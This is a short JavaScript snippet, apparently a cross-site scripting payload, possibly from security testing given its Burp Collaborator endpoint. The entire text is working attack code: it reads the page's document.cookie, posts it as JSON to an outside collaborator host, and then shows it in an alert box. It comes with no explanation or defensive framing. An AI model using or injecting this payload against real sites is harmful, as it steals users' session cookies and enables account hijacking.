var xhr = new XMLHttpRequest();
xhr.open("POST", "https://0de2gubmnz9rh8sf1qp79shrvi18px.burpcollaborator.net", true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({ value: document.cookie }));
alert(document.cookie);
